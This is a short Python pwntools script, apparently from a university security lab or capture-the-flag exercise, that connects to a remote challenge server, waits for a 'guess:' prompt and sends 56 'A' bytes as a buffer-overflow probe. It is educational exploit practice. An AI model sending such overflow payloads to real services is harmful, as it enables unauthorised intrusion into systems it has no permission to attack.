from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22161

## run a remote process
s = remote(SERVER, PORT, timeout=9999)

result = s.recvuntil(b'guess: ')
print(result)
s.sendline(b'A'*56)
result = s.recvline()
print(result)


